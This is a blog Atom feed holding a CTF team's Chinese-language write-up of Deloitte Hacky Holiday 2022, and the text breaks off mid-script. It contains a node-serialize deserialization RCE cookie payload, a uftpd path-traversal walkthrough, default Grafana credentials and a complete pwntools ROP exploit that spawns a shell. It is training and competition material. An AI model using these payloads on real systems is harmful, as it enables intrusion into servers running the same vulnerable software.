<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>老叭美食家</title>
  
  <subtitle>永远热爱生活</subtitle>
  <link href="https://laobameishijia.github.io/atom.xml" rel="self"/>
  
  <link href="https://laobameishijia.github.io/"/>
  <updated>2022-08-04T10:38:04.204Z</updated>
  <id>https://laobameishijia.github.io/</id>
  
  <author>
    <name>老叭美食家</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Deloitte Hacky Holiday 2022 WriteUp</title>
    <link href="https://laobameishijia.github.io/2022/07/29/deloitte-hacky-holiday-2022-writeup/"/>
    <id>https://laobameishijia.github.io/2022/07/29/deloitte-hacky-holiday-2022-writeup/</id>
    <published>2022-07-29T08:00:21.000Z</published>
    <updated>2022-08-04T10:38:04.204Z</updated>
    
    <content type="html"><![CDATA[<p>简介：</p><p>本文Deloitte Hacky Holiday比赛的WriteUp，主办方的题目非常有质量而且梯度拉开非常友好。我们最终在2334只参赛队伍中取得了75名次的成绩，再接再厉！</p><span id="more"></span><p>我们是SCU_HXD: NING0121, meishijia, jackfromeast</p><p>最终的名次：75th / 2334 participated teams</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Teaser-su-admin"><a href="#Teaser-su-admin" class="headerlink" title="Teaser su admin"></a><strong>Teaser su admin</strong></h3><p>这是一道关于 web 页面的题目，共一关为新手村等级。</p><p>这道题关键在于考察 “F12” 开发者模式的使用。首先题目提供了一张图片，为一个盾牌的设计图，要求我们生成同样的盾牌符号，经过尝试，我们只能生成相同配色，但不包含图案的盾牌如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1.png" alt="1-1"></p><p>因此我们使用开发者模式检查元素后发现，在选择配色和花纹时，存在隐藏（hidden）选项，我们只需要将隐藏选项通过修改标签的 Class 值进行开启，就可以实现相同盾牌图形。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-3.png" alt="1-3"></p><p>生成后，便展示出了 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;4DM1N_4PPR0V3D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-GRAPHING-IT-OUT"><a href="#2-5-GRAPHING-IT-OUT" class="headerlink" title="2-5 GRAPHING IT OUT"></a><strong>2-5 GRAPHING IT OUT</strong></h3><p>第一关，要寻找到一个dashboard，根据题目中的描述需要找到网页中被隐藏的入口。打开网页的源码发现，其中存在被注释掉的a标签，根据路由找到了Grafana系统的入口。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/DK-ylZ2Y4MeQzX_WsfrpwA.png" alt="1"></p><p>由于这个系统在之前的课程设计中曾经使用过，初始设置的账号密码均为 admin，经过尝试之后顺利进入到表盘系统中。然后在不同的表盘 General/Sample 中发现了 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;c3deaca3fb4fec9f4900e82b9ee830c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关，题目描述要寻找数据，因为之前在课程设计中 grafana 和 influxDB 两个是结合起来使用的。所以就在 grafana 中查看表盘数据的来源，果然使用的是 influxDB。那么根据经验需要查询数据库中是否有想要的数据。influxDB 中的数据是以 bucket 存在的，在数据库的查询页面中，输入 buckets() ,查询之后，发现有 _monitoring_tasks\data\flag, 四个 bucket，然后就是查询flag中的数据</p><pre class="line-numbers language-none"><code class="language-none">from(bucket:&quot;flag&quot;)    |&gt; range(start:0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询到flag为</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;493c709cff326b344f94acfb6f6cfd81&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关 <strong>Uncompleted</strong></p><h3 id="3-2-HACKY-HOLIDAYS-AIRLINES"><a href="#3-2-HACKY-HOLIDAYS-AIRLINES" class="headerlink" title="3-2 HACKY HOLIDAYS AIRLINES"></a><strong>3-2 HACKY HOLIDAYS AIRLINES</strong></h3><p>此题给出了网站的源码，通过简单的审计，猜测这是一道关于反序列漏洞的题目。如下所示，用户所传递的Cookie在没有经过其他过滤的情况下直接被反序列化，因此可能由此完成RCE。查看其完成反序列化操作的包为’node-serialize’并且版本为0.0.4，搜索后发现果然该版本的node-serialize存在反序列化漏洞CVE-2017-5941。</p><p>![2](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (1).png)</p><p>此漏洞的代码存在于<code>node_modules/node-serialize/lib/serialize.js</code>中。我们可以看到，当反序列化对象的值为<code>string</code>并且以<code>FUNCFLAG(i.e. _$$ND_FUNC$$_)</code>开头时，则会调用eval函数。也就是说，如果我们传入的字符串例如:<code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(&#39;xxx&#39;)&#125;&quot;&#125;</code>，则该语句在截取字符串后就变成了<code>eval(function()&#123;console.log(&#39;xxx&#39;)&#125;)</code>。接着，我们还需要该函数在定义后立即执行，所以在其最后加上括号表示使用IIFE立即调用执行，即可完成RCE。所以构造的目标字符串应该形如：<code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(&#39;xxx&#39;)&#125;()&quot;&#125;</code>.</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/qrbi_kEOvPYhh77r_LwZ1Q.jpeg" alt="3"></p><p>虽然该漏洞存在EXP，但是尝试后发现并不能得到shell。所以此类问题还是需要一步一步本地搭环境来调试，不能急功近利。通过Docker搭建好本地环境后，通常需要完成几个步骤来测试EXP。首先，直接修改源码来调试注入的命令。对于反序列化漏洞而言，我们首先编辑注入的代码，将其序列化后，再以Base64的形式编码生成目标的Cookie字符串。</p><p>当本地环境下可以成功运行后，再通过修改请求报文的Cookie，尝试是否可以成功执行拿到Shell。实验后发现，本地搭建的环境确实可以反弹shell,但是目标环境下总是不能成功。因此，我猜想目标服务器的防火墙Drop禁止了除80端口以外的其他连接，也就无法反弹Shell。</p><p>既然SHELL拿不到，如果可以将flag.txt的内容回显到页面上也是可行的，毕竟通过网站源码我们知道flag.txt的地址。所以，我最后修改执行的命令使得flag字符串写入到index.pug文件里，然后触发反序列化漏洞后，再次请求该页面(此时注入的命令已经执行，index.pug被追加了flag字符串)即可看到flag的内容啦。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> payload <span class="token operator">=</span> '<span class="token punctuation">&#123;</span> <span class="token function-variable function">rce</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'cat /app/flag'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'/app/views/index.pug'</span><span class="token punctuation">,</span> <span class="token string">'  p '</span><span class="token operator">+</span>stdout<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>'<span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'()'</span> <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>## <span class="token constant">EXPOLIT</span><span class="token keyword">var</span> cookieValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> userInfo <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>cookieValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/HKgkKtMAku6jLCyAE9ysWw.png" alt="4"></p><h3 id="3-3-BILLBOARD-MAYHEM"><a href="#3-3-BILLBOARD-MAYHEM" class="headerlink" title="3-3 BILLBOARD MAYHEM"></a><strong>3-3 BILLBOARD MAYHEM</strong></h3><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h2><h3 id="1-3-FACTORY-RESET"><a href="#1-3-FACTORY-RESET" class="headerlink" title="1-3 FACTORY RESET"></a><strong>1-3 FACTORY RESET</strong></h3><p>这是一道Linux下利用Web服务的漏洞拿站的题目，类似于渗透测试。</p><p>首先官方给出的VPN密钥远程连接至其内网，使得可以访问到目标主机10.6.0.100.</p><p>我们首先使用nmap对其进行端口扫描，使用-Pn参数默认目标主机存活且无需DNS域名解析。结果可以看到该主机打开了ssh的22号端口以及ftp的21号端口。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/7YdUtZL_wecmh6dzPiz-wA.png" alt="5"></p><p>接着，我们继续查看ssh和ftp服务的版本信息。这里使用nmap的-A参数即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WdBYRz5hgE5nsb2bQpNnCw.png" alt="6"></p><p>通过结果我们可以看到该ftp服务使用的是uftpd(2.10)而且允许anonymous匿名用户登陆，ftp的可访问目录下存在着三个bash文件。</p><p>顺着思路，我们直接使用nc来连接该ftp端口且使用匿名用户身份登陆。</p><p>​<img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/8bCHHqLj6mUsSWa5ng7C2w.png" alt="7"></p><p>这个时候我继续尝试一些命令如LIST PWD等发现并没有反应，这个的主要原因是ftp协议是带外传输的，也就是说命令连接和数据连接是两个不同的TCP链接。因此我使用其他的ftp链接工具（fileZilla）去连接，并访问得到了这三个bash文件，结果这三个文件并没有什么值得注意的地方。</p><p>此时，我直接去搜索关于uftpd的相关信息，发现uftpd作为开源的ftp服务器已经更新到2.15版本，而目标机器停留在了2.10版本。接着，我找到了关于uftpd的相关漏洞，其中CVE-2020-5221路径穿越漏洞引起了我的注意，毕竟路径穿越就可以找到题目所说的敏感的stolen_data。</p><p>![8](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (6).png)</p><p>根据，<a href="https://arinerron.com/blog/posts/6">此博客</a>提供的POC，我们发现FTP中的若干命令(LIST, RETR)都存在路径穿越的漏洞。不过，回到之前的问题，作为带外传输的FTP协议，我们需要另外建立一个链接来传输数据。这有两种方式，默认为主动连接，即由服务器端主动连接客户端的某个端口，这需要首先使用PORT命令提供客户端开放的端口。但是由于服务器端无法穿越NAT直接连接到我的kali，所以我该用被动链接的方式，也就是由客户端主动连接到服务器中作为数据发送的端口。具体如下所示。</p><p>![9](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (7).png)需要说明的是，PASV使得ftp进入被动模式，给出的10,6,0,100,202,9的含义是开放10.6.0.100:202*256+9端口作为数据传输。所以我是用nc远程连接其51271端口。接着在passwd中我发现存在/var/backups目录，继续使用LIST该目录发现其中存在./DATA/flag1.txt文件。欣喜若狂，至此斩获一150分的大题。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;F0rtREss_Br3@c#3d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-ROP-THE-AI"><a href="#4-2-ROP-THE-AI" class="headerlink" title="4-2 ROP THE AI"></a><strong>4-2 ROP THE AI</strong></h3><p>经典的一道ret2syscall的栈溢出题目。</p><p>首先拿到程序查看其基本信息，发现这是一个静态编译的小端的x86-64位程序。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sqQNwBMtQXgHCWu2mqwXaw.png" alt="10">     </p><p>接着，使用反汇编一下查看其程序逻辑。发现程序逻辑非常简单，main函数中直接调用名为vuln的函数。而在vuln的函数中，首先声明了一个0x70大小的内存空间，接着使用gets()函数获取用户输入存在此内存空间。所以显然栈溢出漏洞就存在于此。</p><p>![11](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (8).png)</p><p>要对漏洞进行利用，我们还需要知道程序所开启的保护。使用gdb-peda中自带的checksec或者下载的checksec脚本可以帮助我们查看该程序开启的保护措施。由下可见，ROPtheAI开启了Canary以及NX。简单来说，前者在弹栈前检查EBP下方的预置的Cookie是否被用户输入覆盖来判断是否存在栈溢出的情况。后者使得Data段(也就是栈所在的段)不具备执行权限，也就是说用户如果在栈中输入了shellcode也是无法执行的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/D95JF6Hrh1qZ0ddOl9PP6w.png" alt="12"></p><p>checksec脚本的原理是依赖于readelf工具查看目标程序(ELF，可执行可链接文件格式)的相关信息比如program headers(存储着程序Segment和Section的信息)、符号表(存储着程序中变量、函数名的类型、位置地址等)等。具体地，checksec对于Canary以及NX保护措施的查看方法如下所示，前者是查询符号表中是否存在__stack_chk_fail函数，后者是查询栈的执行权限。</p><p>![13](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (9).png)</p><p>这种判断Canary的方法我们可以猜想会存在假阳性，毕竟存在__stack_chk_fail函数并其不意味着被链接进去。所以具体的情况我们还是要通过动态调试程序来看是否在程序的入口和弹栈时存在对应的汇编代码。这里可以参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">CTFWiki</a>中对于Canary的具体讲解。本ROPtheAI就是这样一个例子，在调试时并没有发现有执行验证Cookie的汇编代码，所以我们无需思考如何绕过Canary。</p><p>对于NX，在动态调试时可以通过vmmap查看栈是否存在可执行的权限。</p><p> ![14](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (10).png)</p><p>在摸清程序的保护措施之后，我们首先通过动态调试查看栈的结构，确定缓冲区的大小；然后构造ROP链绕过NX保护。</p><p>程序的栈结构以及入栈出栈的过程可以参考<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">此篇文章</a>，介绍的非常细致。缓冲区的大小我们可以通过动态调试时查看RSP和RBP所指向的地址查看或者通过cyclic工具构造有规律的字符串，再判断溢出后RBP中所存储的内容判断偏移。由于本程序的汇编非常简单，通过调试我们可以看到栈中保存RET地址的位置距离输入点的偏移的0x70。</p><p>![15](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (11)-9054164.png)</p><p>由于NX保护的开启，我们无法通过最简单的利用gets函数在栈中嵌入一段shellcode，再将ret的地址指向该shellcode的地址，使其执行shellcode。因为存入的shellcode在data段中的栈中，该地址的指令与在text段中的指令不同，没有执行权限。</p><p>但是ROP技术可以避开此限制，成功突破NX保护。ROP(Return Oriented Programming)技术，是在栈缓冲区溢出的基础上，利用程序中已有的存在ret命令的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。其核心是利用了指令集中的 ret 指令，改变了指令流的执行顺序。</p><p>绕过NX有四种常用的方式：ret2text, ret2shellcode, ret2syscall, 以及ret2libc。第一种方式是比较直接，在程序中查找执行system(‘/bin/sh’)的指令，并将其指令地址覆盖到栈中的ret位置。但是通常来讲，程序中可能并不会在这样的指令。第二种方式是通过write方法将shellcode写入.bss段(通常存放着全局变量，具有可执行权限)，然后再将其写入地址存放于ret位置。第三种方式是利用系统调用(32位程序是int 0x80，64位程序是syscall)并修改寄存器使得执行exceve(‘/bin/sh’,0x0,0x0)系统调用。最后一种方式是对于动态链接的程序，利用存储在glibc(GNC的标准C语言库)中的system函数，执行system(‘/bin/sh’).</p><p>此时，我们需要根据程序中提供的gadgets来选择使用那种方法。查看程序的gadgets我们可以使用ROPgadget工具。使用<code>ROPgadget --binary ~/Desktop/ROPtheAI/ROPtheAI | grep syscall</code> 命令我们可以发现程序中存在非常好利用的系统调用，所以我们选择使用ret2syscall的方式利用该漏洞。                 <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/zayfkMQ1IrSUZOfB7QsdzQ.png" alt="16"></p><p>为了执行exceve系统调用，我们需要使rax的值置为0x3b，表示exceve系统调用的编号；rdi的值置为字符串”/bin/sh\x00”的地址，注意字符串的结尾必须是0x00；rsi和rdx的值为0x00即可。因此我们需要在程序中查找gadgets来构造ROP链，使得执行系统调用时寄存器的值到位。</p><p>接着，我们在全局查找”/bin/sh”字符串，发现并没有该字符串。因此，我们需要利用gadgets向.bss段写入该字符串。首先，我们可以找到操纵rax和rdx的指令，接着我们找一个可以读写的.bss的地址，然后利用类似于mov [rdx], rax；的指令来将字符串写入该地址。具体如下所示。我们找到非常好的写入内存的指令，首先字符串’/bin/sh\x00’正好是8字节，也就是正好放入rax寄存器中，然后rdx置为待写入的地址，然后利用mov qword ptr[rdx], rax指令表示将rax的值放入以rdx的值作为地址的大小为双字(16字节显然足够)的内存中。此payload执行完，我们已将’/bin/sh’写入到地址为0x004b72e0的内存中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pop_rax <span class="token operator">=</span> <span class="token number">0x0044c043</span> <span class="token comment"># pop rax; ret;</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x004016eb</span> <span class="token comment"># pop rdx; ret;</span>writeable_memory_addr <span class="token operator">=</span> <span class="token number">0x004b72e0</span> <span class="token comment"># bss段内地址</span>write_memory <span class="token operator">=</span> <span class="token number">0x0043e353</span> <span class="token comment"># mov qword ptr[rdx], rax; mov rax, rdi; ret</span>payload <span class="token operator">=</span> <span class="token number">120</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_memory<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着，我们只需重新调整寄存器的值并调用syscall即可。完整的EXP如下所示，我使用了一次可以设置三个寄存器值的指令，最后调整rdi为writeable_memory_addr，最后ret系统调用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/home/kali/Desktop/ROPtheAI/ROPtheAI'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("xxx.xxx.xxx.xxx",17004)</span><span class="token comment"># sh = gdb.debug('/home/kali/Desktop/ROPtheAI/ROPtheAI', gdbscript="""</span><span class="token comment"># b vuln</span><span class="token comment"># continue</span><span class="token comment"># """)</span>pop_rax_rdx_rbx <span class="token operator">=</span> <span class="token number">0x00479906</span>pop_rax <span class="token operator">=</span> <span class="token number">0x0044c043</span>pop_rsi <span class="token operator">=</span> <span class="token number">0x004087ce</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00401931</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x004016eb</span>syscall <span class="token operator">=</span> <span class="token number">0x004011fa</span>writeable_memory_addr <span class="token operator">=</span> <span class="token number">0x004b72e0</span> <span class="token comment"># bss段内地址</span>write_memory <span class="token operator">=</span> <span class="token number">0x0043e353</span> <span class="token comment"># mov qword ptr[rdx], rax; mov rax, rdi; ret</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Please enter your preferred configuration:'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">120</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_memory<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_rdx_rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终成功拿到Shell。</p><p>![17](<a href="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image">https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image</a> (12).png)</p><p>最后，其实在整个EXP编写的过程中并不会顺利，所以需要我们使用pwntools自带的gdb来调试我们的payload，查看问题出在哪里再修复，这一点非常重要。此外，通过gdb.debug的方式启用程序可能会由于环境变量，导致栈的内存地址的变化。通过gdb.attach的方式连接已经运行的程序则不会存在这样的问题。</p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h2><h3 id="3-1-CRACK-THE-PASSWORD"><a href="#3-1-CRACK-THE-PASSWORD" class="headerlink" title="3-1 CRACK THE PASSWORD"></a><strong>3-1 CRACK THE PASSWORD</strong></h3><p>改题目提供了一个二进制的文件，用十六进制观察之后，发现师ELF文件。使用IDA反编译之后，发现该程序存在验证密码是否正确的函数。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1R8m6flUkhQITA5wzgsFgw.png" alt="18"></p><p>进入validatePassword之后，发现函数的主要逻辑是验证输入字符串的长度和不同位置之间的关系(根据 特定位置字符的十进制表示来确定关系)。仔细观察之后，发现字符串中存在某些可以确定的字符，如a1[13] = 49 （刚好对应数字1），然后通过这些确定的字符，可以将其他的字符确定下来。最后通过编程将整个字符串解密出来。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/AKOl2mA8sMQQB2s149gWtA.png" alt="19"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">password <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">33</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xA</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token 